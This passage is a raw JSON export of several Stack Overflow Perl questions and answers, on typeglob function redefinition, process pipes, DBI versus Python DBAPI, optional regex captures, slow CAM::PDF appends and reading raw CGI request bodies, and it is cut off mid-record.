"title": "Redefine perl function using typeglob doesn&#39;t work as expected", "body": "<p>This example works fine:</p>\n\n<pre><code>use File::Slurp qw(read_file);\nlocal *File::Slurp::read_file = sub {\n    return 'test';\n};\n\nwarn File::Slurp::read_file('/root/test.txt'); # return 'test'\n</code></pre>\n\n<p>this one too:</p>\n\n<pre><code>use File::Slurp qw(read_file);\nlocal *read_file = sub {\n    return 'test';\n};\n\nwarn read_file('/root/test.txt');   # return 'test'\n</code></pre>\n\n<p>but if I use full name of function in typeglob it doesn't work and attempt to read file:</p>\n\n<pre><code>use File::Slurp qw(read_file);\nlocal *File::Slurp::read_file = sub {\n    return 'test';\n};\n\nwarn read_file('/root/test.txt');\n</code></pre>\n\n<p>Could anyone explain why I can not redefine subroutine by full namespace, <code>File::Slurp::read_file</code>, and use by short name?</p>\n\n<p>In case of object method, it works fine:</p>\n\n<pre><code>use LWP::UserAgent;\nlocal *LWP::UserAgent::get = sub {\n    return HTTP::Response-&gt;new( undef, undef, undef, 'Hello world' );    \n};\n\nmy $ua = LWP::UserAgent-&gt;new;\nwarn $ua-&gt;get()-&gt;content;\n</code></pre>\n"}, {"tags": ["bash", "perl", "pipe"], "comments": [{"owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "edited": false, "score": 0, "creation_date": 1533033194, "post_id": 51608442, "comment_id": 90187165, "body": "Why does this have to be in a Perl scrip? Why can&#39;t you use bash directly?"}], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 6, "last_activity_date": 1533024898, "creation_date": 1533024898, "answer_id": 51608565, "question_id": 51608442, "link": "https://stackoverflow.com/questions/51608442/how-to-connect-processes-via-pipe-in-perl/51608565#51608565", "title": "How to connect processes via pipe in Perl?", "body": "<p>Just use another open, but revert the direction of the pipe:</p>\n\n<pre><code>open my $in,  '-|', 'foo' or die $!;\nopen my $out, '|-', 'bar' or die $!;\nwhile ( my $row = &lt;$in&gt; ) {\n    # do stuff\n    print {$out} $row;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "is_accepted": false, "score": 2, "last_activity_date": 1533075120, "creation_date": 1533075120, "answer_id": 51622834, "question_id": 51608442, "link": "https://stackoverflow.com/questions/51608442/how-to-connect-processes-via-pipe-in-perl/51622834#51622834", "title": "How to connect processes via pipe in Perl?", "body": "<p>Another option is using <a href=\"https://metacpan.org/pod/IPC::Pipeline\" rel=\"nofollow noreferrer\">IPC::Pipeline</a> to chain the processes together instead of doing it manually.</p>\n"}, {"tags": [], "owner": {"reputation": 2000, "user_id": 1275160, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/0e59227edde0173c28ade664aac101ec?s=128&d=identicon&r=PG", "display_name": "Diab Jerius", "link": "https://stackoverflow.com/users/1275160/diab-jerius"}, "is_accepted": false, "score": 0, "last_activity_date": 1533566296, "creation_date": 1533566296, "answer_id": 51710113, "question_id": 51608442, "link": "https://stackoverflow.com/questions/51608442/how-to-connect-processes-via-pipe-in-perl/51710113#51710113", "title": "How to connect processes via pipe in Perl?", "body": "<p><a href=\"https://metacpan.org/pod/IPC::Run\" rel=\"nofollow noreferrer\">IPC::Run</a> is also another (somewhat daunting) option.  If you end up with complex pipelines, may I also recommend (shameless promotion of own module) <a href=\"https://metacpan.org/pod/IPC::PrettyPipe\" rel=\"nofollow noreferrer\">IPC::PrettyPipe</a>, which I wrote to help render complex pipelines.</p>\n"}], "owner": {"reputation": 5170, "user_id": 353652, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/d08a67d61b3cccdb5e47ad9b7c56a113?s=128&d=identicon&r=PG", "display_name": "Lars Schneider", "link": "https://stackoverflow.com/users/353652/lars-schneider"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 178, "favorite_count": 0, "accepted_answer_id": 51608565, "answer_count": 3, "score": 1, "last_activity_date": 1533566296, "creation_date": 1533024466, "question_id": 51608442, "link": "https://stackoverflow.com/questions/51608442/how-to-connect-processes-via-pipe-in-perl", "title": "How to connect processes via pipe in Perl?", "body": "<p>I want to write a Perl script which runs the programs <code>foo</code> and <code>bar</code> and processes <code>stdout</code> of <code>foo</code> and emits it to <code>stdin</code> of <code>bar</code> in a streaming fashion. The Perl script should act like this <code>bash</code> command: </p>\n\n<pre><code>$ foo | some-perl-code | bar\n</code></pre>\n\n<p>I managed to do the first part with the snippet below. I start the program <code>foo</code> and open the pipe to read <code>stdout</code>.</p>\n\n<pre><code>open( my $pipe_fh, \"foo |\" );\nwhile ( my $row = &lt;$pipe_fh&gt; ) {\n   # do stuff\n    print $row;\n}\n</code></pre>\n\n<p>How can I realize the second part? How can I emit <code>$row</code> to the program <code>bar</code> <em>within</em> my Perl script?</p>\n"}, {"tags": ["python", "database", "api", "perl"], "comments": [{"owner": {"reputation": 8332, "user_id": 63717, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/6a4b268b489c3cc68157f5112c45a287?s=128&d=identicon&r=PG", "display_name": "Matthew Daly", "link": "https://stackoverflow.com/users/63717/matthew-daly"}, "edited": false, "score": 0, "creation_date": 1533020970, "post_id": 51606377, "comment_id": 90179900, "body": "I&#39;m not aware of any, but you could use an ORM."}], "answers": [{"tags": [], "owner": {"reputation": 54872, "user_id": 1521179, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/MH7pk.png?s=128&g=1", "display_name": "amon", "link": "https://stackoverflow.com/users/1521179/amon"}, "is_accepted": false, "score": 4, "last_activity_date": 1533021134, "creation_date": 1533021134, "answer_id": 51607452, "question_id": 51606377, "link": "https://stackoverflow.com/questions/51606377/single-api-for-various-databases-in-python/51607452#51607452", "title": "Single API for various Databases in Python", "body": "<p>There is no Python equivalent to Perl's DBI-centric ecosystem. Instead:</p>\n\n<ul>\n<li>The DBAPI (PEP 249) defines a common low-level interface that relational database drivers are expected to provide.</li>\n<li>Some projects like SQLAlchemy Core abstract over multiple drivers, using the common DBAPI interface.</li>\n</ul>\n\n<p>Python's lack of a proper DBI equivalent is less of a disadvantage than it would be in Perl due to the different module system. Assuming you are restricting yourself to a common SQL subset and to the DBAPI instead of using driver-specific extensions, switching to a different driver can be as simple as changing an import, and updating the connection information:</p>\n\n<pre><code>- import somedatabase as db\n+ import differentdriver as db\n</code></pre>\n\n<p>In practice, neither Python's DBAPI nor Perl's DBI will enable you to switch databases at a whim. However, Perl's DBI makes it much easier to write software that works with multiple databases.</p>\n"}], "owner": {"reputation": 532, "user_id": 6623469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3ebc0962a7ca106f4294fe9cd3ba0c3?s=128&d=identicon&r=PG&f=1", "display_name": "krish___na", "link": "https://stackoverflow.com/users/6623469/krish-na"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 145, "favorite_count": 1, "answer_count": 1, "score": 3, "last_activity_date": 1533021134, "creation_date": 1533017038, "question_id": 51606377, "link": "https://stackoverflow.com/questions/51606377/single-api-for-various-databases-in-python", "title": "Single API for various Databases in Python", "body": "<p>I hold good experience in working with Perl DBI module.The DBI module acts as single API for multiple databases like Oracle, Postgres, etc.</p>\n\n<p>I have recently started working on Python and I noticed that there are separate API for each databases in Python.</p>\n\n<p>Following are my questions:\n1. Isn't there <strong>single DB API</strong> in Python?\n2. If not, isn't this a disadvantage in Python?</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 2410, "user_id": 8217112, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FB7l5icjoDo/AAAAAAAAAAI/AAAAAAAACPA/jgQiuzBBY3c/photo.jpg?sz=128", "display_name": "noah", "link": "https://stackoverflow.com/users/8217112/noah"}, "edited": false, "score": 0, "creation_date": 1532980767, "post_id": 51601387, "comment_id": 90168978, "body": "&quot;visual&quot; of my current regex: <a href=\"https://regex101.com/r/xEW3xj/1/\" rel=\"nofollow noreferrer\">regex101.com/r/xEW3xj/1</a>"}, {"owner": {"reputation": 373, "user_id": 8845620, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b0082695b3d26ff97841bb1e65862a0a?s=128&d=identicon&r=PG&f=1", "display_name": "UncleCarl", "link": "https://stackoverflow.com/users/8845620/unclecarl"}, "edited": false, "score": 1, "creation_date": 1532981571, "post_id": 51601387, "comment_id": 90169338, "body": "I don&#39;t understand your issue with not being able to use $2 in your look-ahead example. It will get set each time the regex is applied. Checking for it being defined or not seems like that would give you your form type. Maybe an example with some code would help."}, {"owner": {"reputation": 2410, "user_id": 8217112, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FB7l5icjoDo/AAAAAAAAAAI/AAAAAAAACPA/jgQiuzBBY3c/photo.jpg?sz=128", "display_name": "noah", "link": "https://stackoverflow.com/users/8217112/noah"}, "reply_to_user": {"reputation": 373, "user_id": 8845620, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b0082695b3d26ff97841bb1e65862a0a?s=128&d=identicon&r=PG&f=1", "display_name": "UncleCarl", "link": "https://stackoverflow.com/users/8845620/unclecarl"}, "edited": false, "score": 0, "creation_date": 1532985272, "post_id": 51601387, "comment_id": 90170759, "body": "@UncleCarl you are correct. <code>$2</code> will work by checking if defined. I was for some reason thinking <code>$2</code> wouldn&#39;t get reset if no second set of binding parenthesis existed which in hindsight makes no sense. All the lexical variables get reset on any match so my above code will work."}], "answers": [{"comments": [{"owner": {"reputation": 2410, "user_id": 8217112, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FB7l5icjoDo/AAAAAAAAAAI/AAAAAAAACPA/jgQiuzBBY3c/photo.jpg?sz=128", "display_name": "noah", "link": "https://stackoverflow.com/users/8217112/noah"}, "edited": false, "score": 0, "creation_date": 1532984786, "post_id": 51601554, "comment_id": 90170592, "body": "You are correct about adding the ? to the regex. When I copied and pasted the regex from one place to another I forgot to add it back in. I fixed my question now."}, {"owner": {"reputation": 2410, "user_id": 8217112, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FB7l5icjoDo/AAAAAAAAAAI/AAAAAAAACPA/jgQiuzBBY3c/photo.jpg?sz=128", "display_name": "noah", "link": "https://stackoverflow.com/users/8217112/noah"}, "edited": false, "score": 0, "creation_date": 1532984946, "post_id": 51601554, "comment_id": 90170652, "body": "<code>$2</code> being reset each match makes it work. You are correct. I for some reason thought <code>$2</code> wouldn&#39;t get reset on the chance there is no second capture parenthesis to match. Which in hindsight makes no sense."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1533236654, "post_id": 51601554, "comment_id": 90284554, "body": "There seem to be <i>two</i> words before the brackets. The OP wants the first of them, so the pattern should be something like <code>&#47;(\\w*) \\s* \\w+ (?:\\[0:(\\d+)\\])?; &#47;x</code>"}], "tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": true, "score": 4, "last_activity_date": 1532981254, "creation_date": 1532981254, "answer_id": 51601554, "question_id": 51601387, "link": "https://stackoverflow.com/questions/51601387/regex-confirm-if-a-optional-portion-was-matched/51601554#51601554", "title": "regex: confirm if a optional portion was matched", "body": "<p>You can use <code>?</code> to optionally match portions of your regex. Then you can capture the output directly as a return value from the regex.</p>\n\n<pre><code>my $re = qr{ (\\w*) \\s* (?:\\[0:(\\d+)\\])?; }x;\nif( my($word, $num) = $line =~ $re ) {\n    say \"Word: $word\";\n    say \"Num: $num\" if defined $num;\n}\nelse {\n    say \"No match\";\n}\n</code></pre>\n\n<p><code>(?:\\[0:(\\d+)\\])?</code> says there <em>may</em> be a <code>[0:\\d+]</code>. <code>(?:)</code> makes the grouping non-capturing so only <code>\\d+</code> is captured.</p>\n\n<p><code>$1</code> and <code>$2</code> are also safe to use, they are reset on each match, but using lexical variables makes things more explicit.</p>\n"}], "owner": {"reputation": 2410, "user_id": 8217112, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FB7l5icjoDo/AAAAAAAAAAI/AAAAAAAACPA/jgQiuzBBY3c/photo.jpg?sz=128", "display_name": "noah", "link": "https://stackoverflow.com/users/8217112/noah"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 51601554, "answer_count": 1, "score": 1, "last_activity_date": 1532985116, "creation_date": 1532980554, "last_edit_date": 1532985116, "question_id": 51601387, "link": "https://stackoverflow.com/questions/51601387/regex-confirm-if-a-optional-portion-was-matched", "title": "regex: confirm if a optional portion was matched", "body": "<p>I have a string that can be of two forms, and it is unknown which form it will be each time:</p>\n\n<p><code>hello world[0:10];</code> or <code>hello world;</code></p>\n\n<p>There may or may not be the brackets with numbers. The two words (hello and world) can vary. If the brackets and numbers are there, the first number is always 0 and the second number (10) varies.</p>\n\n<p>I need to capture the first word (hello) and, if it exists, the second number (10). I also need to know which form of the string it was.</p>\n\n<p><code>hello world[0:10];</code> I would capture {hello, 10, form1}, and <code>hello world;</code> I would capture {hello, form2}. I don't really care how the \"form\" is formatted, I just need to be able to differentiate. It can be a bit (1=form1, 0=form2), structural (form1 puts me in one scope and form2 another), etc.</p>\n\n<hr>\n\n<p>I currently have the following <em>(now working)</em> regex:</p>\n\n<p><code>/(\\w*) \\s \\w* (?:\\[0:(\\d*)\\])?;/x</code></p>\n\n<p>This gives me <code>$1 = hello</code> and potentially <code>$2 = 10</code>. <s>I now just need to know if the bracketed numbers were there or not. This will be repeated many times, so I can't assume <code>$2 = undef</code> going into the regex. <code>$2</code> could also be the same thing a few times in a row so I can't just look for a change in <code>$2</code> before and after the regex.</p>\n\n<p>My best solution so far is to run the regex twice, the first time with the brackets and the second time without:</p>\n\n<pre><code>if( /(\\w*) \\s \\w* \\[0:(\\d*)\\];/x ) {...}\nelsif( /(\\w*) \\s \\w*;/x ) {...}\n</code></pre>\n\n<p>This seems very inefficient and inelegant though so I was wondering if there is a better way? </s></p>\n"}, {"tags": ["perl", "pdf", "cam-pdf"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1532978523, "post_id": 51600501, "comment_id": 90167967, "body": "I don&#39;t know this module, but how about patching together smaller, intermediate files? Say, make 10 files 100 pages each, then merge those? (If the module&#39;s problem is simply the document size then this can&#39;t help.)"}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1532983482, "post_id": 51600501, "comment_id": 90170137, "body": "Is there anything wrong with generating all the pages individually, and then concatenating them using <a href=\"https://www.ghostscript.com/\" rel=\"nofollow noreferrer\">Ghoststcript</a> or <a href=\"https://metacpan.org/pod/PDF::Reuse\" rel=\"nofollow noreferrer\">PDF::Reuse</a>? See also <a href=\"https://www.nu42.com/2015/11/combine-tpp-single-document.html\" rel=\"nofollow noreferrer\">this post</a> where I compose a single document out of a bunch of pages."}, {"owner": {"reputation": 373, "user_id": 8845620, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b0082695b3d26ff97841bb1e65862a0a?s=128&d=identicon&r=PG&f=1", "display_name": "UncleCarl", "link": "https://stackoverflow.com/users/8845620/unclecarl"}, "edited": false, "score": 0, "creation_date": 1532983585, "post_id": 51600501, "comment_id": 90170174, "body": "I also haven&#39;t used this module. I assume you had the problem before adding cleansave(), as that seems like it would make it slower, not faster. Also, have you looked at preserveOrder() to prevent some internal sorting? Lastly, can you get it to work with save(), rather than cleansave()? Otherwise, seeing some of your code might help. Also, can you put in some debugging to determine where the slowness is occurring?"}, {"owner": {"reputation": 2000, "user_id": 1275160, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/0e59227edde0173c28ade664aac101ec?s=128&d=identicon&r=PG", "display_name": "Diab Jerius", "link": "https://stackoverflow.com/users/1275160/diab-jerius"}, "edited": false, "score": 0, "creation_date": 1533567839, "post_id": 51600501, "comment_id": 90382367, "body": "Not Perl, but might solve your problem: <a href=\"https://www.pdflabs.com/tools/pdftk-server/\" rel=\"nofollow noreferrer\">pdflabs.com/tools/pdftk-server</a>.  If you&#39;re running linux, it might already be available from your distribution."}], "answers": [{"tags": [], "owner": {"reputation": 8537, "user_id": 14783, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/7f7ebc731345d37a667c3242cf928703?s=128&d=identicon&r=PG", "display_name": "Chris Dolan", "link": "https://stackoverflow.com/users/14783/chris-dolan"}, "is_accepted": false, "score": 1, "last_activity_date": 1534008438, "creation_date": 1534008438, "answer_id": 51802100, "question_id": 51600501, "link": "https://stackoverflow.com/questions/51600501/tips-on-speeding-up-campdf-when-appending-more-than-1-000-files/51802100#51802100", "title": "Tips on speeding up CAM::PDF when appending more than 1,000 files?", "body": "<p>Chris Dolan here. I've never tried using CAM::PDF at that scale, but I tested with a little 100kb PDF and could not reproduce the slowdown. I tested with this little program:</p>\n\n<pre><code>use warnings;\nuse strict;\nuse CAM::PDF;\n\nmy $file = shift;\nmy $in = CAM::PDF-&gt;new($file) or die;\n\nfor my $i (0..1000) {\n   print \"$i\\n\";\n   $in-&gt;appendPDF(CAM::PDF-&gt;new($file));\n}\n</code></pre>\n\n<p>and it took about the same amount of time to append the 1000th file as the first one. Maybe there's some details of your specific PDFs that are causing pathological behavior in the library?? Without more info it's really tough to say.</p>\n\n<p>Maybe the problem is that you're running out of memory and thrashing, but since the PDFs are so small I wouldn't have thought so. I assume you've tried with and without the cleansave()? As @zdmi says, combining them in a binary tree might help speed up some of the early combines but it might still be very slow combining the last few nodes.</p>\n"}], "owner": {"reputation": 1, "user_id": 10156951, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6781167fe130f29c6a57ab55b3e07089?s=128&d=identicon&r=PG", "display_name": "T. Chuang", "link": "https://stackoverflow.com/users/10156951/t-chuang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1534008438, "creation_date": 1532976874, "question_id": 51600501, "link": "https://stackoverflow.com/questions/51600501/tips-on-speeding-up-campdf-when-appending-more-than-1-000-files", "title": "Tips on speeding up CAM::PDF when appending more than 1,000 files?", "body": "<p>CAM::PDF from Chris Dolan has been a phenominal asset for me. Recent project calls for combining more than 1,000 small PDF files into one big file.</p>\n\n<p>All is well until the pages get up to more than 200, at which point it starts to slow down. Eventually, it takes about 30 seconds or more to append each additional file.</p>\n\n<p>I'm using the following code after each append, hoping to clear up cache to speed thing up:</p>\n\n<pre><code>if ($PDF-&gt;needsSave()) { $PDF-&gt;cleansave() }\n</code></pre>\n\n<p>I have already reduced each of the small PDF files down to 45kb each.</p>\n\n<p>Short of server upgrades, is there anything else I should do on the coding side to see improvements in speed?</p>\n\n<p>Thanks in advance!</p>\n"}, {"tags": ["perl", "cgi", "cgi.pm"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1532977329, "post_id": 51599761, "comment_id": 90167377, "body": "CGi.pm doesn&#39;t save the raw form of what it received when it&#39;s form data."}, {"owner": {"reputation": 33, "user_id": 4630761, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206208360597631/picture?type=large", "display_name": "Siddharth Pathak", "link": "https://stackoverflow.com/users/4630761/siddharth-pathak"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1532978558, "post_id": 51599761, "comment_id": 90167985, "body": "@ikegami Ouch, then I am stuck. What if I can get what encoding it is using, and then encode it? If yes, how do I get what type of encoding client is using?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1532978955, "post_id": 51599761, "comment_id": 90168188, "body": "Can&#39;t, because <code>abc=def</code> and <code>%61bc=def</code> are two equivalent ways of encoding <code>abc=def</code>. You could fool CGI.pm into thinking it&#39;s not form data, or you could avoid using CGI.pm and handle the inputs yourself."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1533050686, "post_id": 51599761, "comment_id": 90199305, "body": "Just avoid the CGI module."}, {"owner": {"reputation": 37436, "user_id": 1215106, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/615ff12525dbd5868b7c78d9754aed72?s=128&d=identicon&r=PG", "display_name": "\u2126mega", "link": "https://stackoverflow.com/users/1215106/%e2%84%a6mega"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1570452830, "post_id": 51599761, "comment_id": 102906918, "body": "@Borodin - That is not very helpful, as there is a lot of useful functionality."}], "answers": [{"tags": [], "owner": {"reputation": 342, "user_id": 2038089, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b63f7e356acc7018e0c5c57bbf632532?s=128&d=identicon&r=PG", "display_name": "Ahmad Bilal", "link": "https://stackoverflow.com/users/2038089/ahmad-bilal"}, "is_accepted": false, "score": -2, "last_activity_date": 1533149091, "creation_date": 1533149091, "answer_id": 51640304, "question_id": 51599761, "link": "https://stackoverflow.com/questions/51599761/get-raw-request-body-using-perl-cgi-pm/51640304#51640304", "title": "Get raw request body using perl CGI.pm", "body": "<p>Though I'm not sure which Perl Module can handle it all for you, but here is a basic rundown. </p>\n\n<p>Your HTML form should submit to a .cgi file (or any other handler which is properly defined). </p>\n\n<p>The raw request is something similar to this:</p>\n\n<pre><code>POST HTTP/1.1\nUserAgent: Mozilla/5.0\nContent-Length: 69\nHost: 127.0.0.1\n(More headers depending on situation and then a single blank line)\n\n(Message Body Containing data)\nusername=John&amp;password=123J (example)\n</code></pre>\n\n<p><a href=\"https://en.wikipedia.org/wiki/List_of_HTTP_header_fields\" rel=\"nofollow noreferrer\">https://en.wikipedia.org/wiki/List_of_HTTP_header_fields</a>)</p>\n\n<p>What will happen is that, this data is available via the CGI (not CGI perl module aka CGI.pm) using the environment variables and stdin (header feilds are passed using EV and message body using stdin). </p>\n\n<p>In Perl, I think you need this to read those EVs: <a href=\"http://perldoc.perl.org/Env.html\" rel=\"nofollow noreferrer\">http://perldoc.perl.org/Env.html</a></p>\n\n<p>And this to read stdin: <a href=\"https://perlmaven.com/read-from-stdin\" rel=\"nofollow noreferrer\">https://perlmaven.com/read-from-stdin</a></p>\n\n<p>From there on, you can process as needed. </p>\n\n<p>BE CAREFULL, when reading any of these. You can be sent malformed information like 100GB valid data in one of the HTTP headers, or in message body, which can break havoc on you or dangerous system calls, etc. Sterilizing is necessary, before passing the data to other places. </p>\n"}, {"tags": [], "owner": {"reputation": 37436, "user_id": 1215106, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/615ff12525dbd5868b7c78d9754aed72?s=128&d=identicon&r=PG", "display_name": "\u2126mega", "link": "https://stackoverflow.com/users/1215106/%e2%84%a6mega"}, "is_accepted": false, "score": 0, "last_activity_date": 1570545785, "last_edit_date": 1570545785, "creation_date": 1570455350, "answer_id": 58270687, "question_id": 51599761, "link": "https://stackoverflow.com/questions/51599761/get-raw-request-body-using-perl-cgi-pm/58270687#58270687", "title": "Get raw request body using perl CGI.pm", "body": "<p>To handle all cases, including those when <em>Content-Type</em> is <code>multipart/form-data</code>, read (and put back) the raw data, <strong>before</strong> CGI does. </p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse IO::Handle;\nuse IO::Scalar;\n\nSTDIN-&gt;blocking(1); # ensure to read everything\nmy $cgi_raw = '';\n\n{ \n  local $/; \n  $cgi_raw = &lt;STDIN&gt;;\n  my $s;\n  tie  *STDIN, 'IO::Scalar', \\$s;\n  print STDIN $cgi_raw;\n  tied(*STDIN)-&gt;setpos(0);\n}\n\nuse CGI qw /:standard/;\n...\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 4630761, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206208360597631/picture?type=large", "display_name": "Siddharth Pathak", "link": "https://stackoverflow.com/users/4630761/siddharth-pathak"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 558, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1570545785, "creation_date": 1532973461, "last_edit_date": 1533050608, "question_id": 51599761, "link": "https://stackoverflow.com/questions/51599761/get-raw-request-body-using-perl-cgi-pm", "title": "Get raw request body using perl CGI.pm", "body": "<p>I am building a web server using Apache and Perl CGI which processes the POST requests sent to it. The processing part requires me to get the completely unprocessed data from the request and verify its signature. </p>\n\n<p>The client sends two different kinds of POST requests: one with the content-type set as <code>application/json</code>, and the second one with content type as <code>application/x-www-form-urlencoded</code>.</p>\n\n<p>I was able to fetch the <code>application/json</code> data using <code>cgi-&gt;param('POSTDATA')</code>. But if I do the same for <code>application/x-www-form-urlencoded</code> data, i.e. <code>cgi-&gt;param('payload')</code>, I get the data but it's already decoded. I want the data in its original URL-encoded format. i.e I want the unprocessed data as it is sent out by the client. </p>\n\n<p>I am doing this for verifying requests sent out by Slack. </p>\n"}, {"tags": ["perl", "unix"], "comments": [{"owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 1, "creation_date": 1532968805, "post_id": 51598375, "comment_id": 90163153, "body": "I would approach this first by clarifying exactly how ranges should be merged. For example, I had this question thinking about it:  Question: the 22295 223876 line:  a) would that combine with the above to have only 204428  to 223876? b) what if that line were 22293 223876 - would that leave you with 204428 to 223876?  Then I&#39;d implement a function to merge ranges. What have you tried so far?"}, {"owner": {"reputation": 602, "user_id": 8364542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fcd327ab0741e66abc506ffdb126975?s=128&d=identicon&r=PG&f=1", "display_name": "hoffmeister", "link": "https://stackoverflow.com/users/8364542/hoffmeister"}, "edited": false, "score": 6, "creation_date": 1532969044, "post_id": 51598375, "comment_id": 90163263, "body": "Are you looking to hire a programmer? or do you have a question?"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1532970660, "post_id": 51598375, "comment_id": 90164104, "body": "<i>I hope to get the solution...</i> And I hope that a new car shows up in my garage tomorrow morning, but I&#39;m not holding my breath."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 3, "creation_date": 1532972311, "post_id": 51598375, "comment_id": 90164933, "body": "Where is the Perl code that you want help with?"}], "answers": [{"tags": [], "owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", 